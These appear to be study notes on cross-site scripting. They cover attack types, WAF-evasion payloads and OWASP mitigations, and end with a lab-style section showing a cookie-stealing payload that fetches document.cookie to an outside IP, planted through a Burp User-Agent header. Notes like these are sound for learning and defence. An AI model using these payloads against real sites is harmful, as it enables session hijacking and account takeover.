# Cross-Site-Scripting (XSS)

***Cross-site scripting*** (***XSS***) vulnerabilities, which have become some of the most common web application vulnerabilities, are achieved using the following attack types:

- Reflected XSS
- Stored (persistent) XSS
- DOM-based XSS

Successful exploitation could result in installation or execution of malicious code, account compromise, session cookie hijacking, revelation or modification of local files, or site redirection.

### You typically find XSS vulnerabilities in the following:

- Search fields that echo a search string back to the user
- HTTP headers
- Input fields that echo user data
- Error messages that return user-supplied text
- Hidden fields that may include user input data
- Applications (or websites) that display user-supplied data

The following example shows an XSS test that can be performed from a browser’s address bar:

```jsx
javascript:alert("test");

javascript:alert(document.cookie);
```

The following example shows an XSS test that can be performed in a user input field in a web form:

```jsx
<script>alert("XSS Test")</script>
```

---

### Reflected XSS

- ***Reflected XSS*** attacks (that is, non-persistent XSS attacks) occur when malicious code or scripts are injected by a vulnerable web application using any method that yields a response as part of a valid HTTP request.
- An example of a reflected XSS attack is a user being persuaded to follow a malicious link to a vulnerable server that injects (reflects) the malicious code back to the user’s browser.
- This causes the browser to execute the code or script. In this case, the vulnerable server is usually a known or trusted site.

**NOTE** Examples of methods of delivery for XSS exploits are phishing emails, messaging applications, and search engines.

![image.png](image.png)

(Example steps of a reflected XSS attack)

---

### Stored XSS

- Stored, or persistent, XSS attacks occur when malicious code or script is permanently stored on a vulnerable or malicious server, using a database.
- These attacks are typically carried out on websites hosting blog posts (comment forms), web forums, and other permanent storage methods.
- An example of a stored XSS attack is a user requesting the stored information from the vulnerable or malicious server, which causes the injection of the requested malicious script into the victim’s browser.
- In this type of attack, the vulnerable server is usually a known or trusted site.

![image.png](image%201.png)

(stored XSS in web form)

- After the user clicks the Sign Guestbook button, the dialog box shown in Figure 6-20 appears.
- The attack persists because even if the user navigates out of the page and returns to that same page, the dialog box continues to pop up.

![image.png](image%202.png)

(a persistent stored XSS attack)

- In this example, the dialog box message is “Omar was here!”
- However, in a real attack, an attacker might present users with text persuading them to perform a specific action, such as “your password has expired” or “please log in again.”
- The goal of the attacker would be to redirect the user to another site to steal his or her credentials when the user tries to change the password or once again log in to the fake application.
- The Document Object Model (DOM) is a cross-platform and language-independent application programming interface that treats an HTML, XHTML, or XML document as a tree structure.
- DOM-based attacks are typically reflected XSS attacks that are triggered by sending a link with inputs that are reflected to the web browser.
- In DOM-based XSS attacks, the payload is never sent to the server. Instead, the payload is only processed by the web client (browser).
- In a DOM-based XSS attack, the attacker sends a malicious URL to the victim, and after the victim clicks on the link, the attacker may load a malicious website or a site that has a vulnerable DOM route handler.
- After the vulnerable site is rendered by the browser, the payload executes the attack in the user’s context on that site.
- One of the effects of any type of XSS attack is that the victim typically does not realize that an attack has taken place.

---

### XSS Evasion Techniques

- Numerous techniques can be used to evade XSS protections and security products such as web application firewalls (WAFs).
- Instead of listing all the different evasion techniques outlined by OWASP, this section reviews some of the most popular techniques.
- First, consider an XSS JavaScript injection that would be detected by most XSS filters and security solutions:

```jsx
<SCRIPT SRC=http://malicious.h4cker.org/xss.js></SCRIPT>
```

- The following example shows how the HTML **img** tag can be used in several ways to potentially evade XSS filters:

```jsx
<img src="javascript:alert('xss');">

<img src=javascript:alert('xss')>

<img src=javascript:alert(&quot;XSS&quot;)>

<img src=javascript:alert('xss')>
```

- It is also possible to use other malicious HTML tags (such as tags), as demonstrated here:

```jsx
<a onmouseover="alert(document.cookie)">This is a malicious link</a>

<a onmouseover=alert(document.cookie)>This is a malicious link</a>
```

- An attacker may also use a combination of hexadecimal HTML character references to potentially evade XSS filters, as demonstrated here:

```jsx
<img src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&

#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
```

- US ASCII encoding may bypass many content filters and can also be used as an evasion technique, but it works only if the system transmits in US ASCII encoding or if it is manually set.
- This technique is useful against WAFs. The following example demonstrates the use of US ASCII encoding to evade WAFs:

```jsx
¼script¾alert(¢XSS¢)¼/script¾
```

- The following example shows an evasion technique that involves using the HTML **embed** tags to embed a Scalable Vector Graphics (SVG) file:

```jsx
<EMBED SRC=”data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH

A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcm

cvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3

hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaW

dodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdC

I+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml"

AllowScriptAccess="always"></EMBED>
```

---

### XSS Mitigations

The following are general rules for preventing XSS attacks, according to OWASP:

- Use an auto-escaping template system.
- Never insert untrusted data except in allowed locations.
- Use HTML escape before inserting untrusted data into HTML element content.
- Use attribute escape before inserting untrusted data into HTML common attributes.
- Use JavaScript escape before inserting untrusted data into JavaScript data values.
- Use CSS escape and strictly validate before inserting untrusted data into HTML-style property values.
- Use URL escape before inserting untrusted data into HTML URL parameter values.
- Sanitize HTML markup with a library such as ESAPI to protect the underlying application.
- Prevent DOM-based XSS by following OWASP’s recommendations athttps://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
- Use the **HTTPOnly** cookie flag.
- Implement content security policy.
- Use the **X-XSS-Protection** response header.

- You should also convert untrusted input into a safe form, where the input is displayed as data to the user.
- This prevents the input from executing as code in the browser.
- To do this, perform the following HTML entity encoding:

```jsx
Convert & to **&amp;.**
```

```jsx
Convert < to **&lt;**.
```

```jsx
Convert > to **&gt;.**
```

```jsx
Convert “ to **&quot;.**
```

```jsx
Convert “ to **&#x27;.**
```

```jsx
Convert / to **&#x2F;.**
```

- The following are additional best practices for preventing XSS attacks:
- Escape all characters (including spaces but excluding alphanumeric characters) with the HTML entity **&#xHH;** format (where **HH** is a hex value).
- Use URL encoding only, not the entire URL or path fragments of a URL, to encode parameter values.
- Escape all characters (except for alphanumeric characters), with the **\uXXXX** Unicode escaping format (where **X** is an integer).
- CSS escaping supports **\XX** and **\XXXXXX**, so add a space after the CSS escape or use the full amount of CSS escaping possible by zero-padding the value.
- Educate users about safe browsing to reduce their risk of falling victim to XSS attacks.
- XSS controls are now available in modern web browsers.

---

### EXTRA FUN STUFF AND EXAMPLES!!!

### Useful Links

[https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)

[https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss)

### Stealing Cookies

Used to steal cookies from web host

Input into user agent section of burpsuite request

```jsx
<img src=x onerror=fetch('http://10.0.2.15/'+document.cookie);>
```

### Finding Vulnerable Fields

To test for vulnerable fields use alert function (URL encrypted) 

```jsx
<script>alert(1)</script>
```

If vulnerable will alert onto server

what the burpsuite request will look like

```jsx
POST /support HTTP/1.1
Host: 10.10.11.8:5000
User-Agent: <img src=x onerror=fetch('http://10.10.11.8/'+document.cookie);>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 84
Origin: http://10.10.11.8:5000
Connection: close
Referer: http://10.10.11.8:5000/support
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Upgrade-Insecure-Requests: 1

fname=a&lname=a&email=a%40a.com&phone=a&message=%3Cscript%3Ealert%281%29%3Cscript%3E
```

gets this response from python http server on desktop
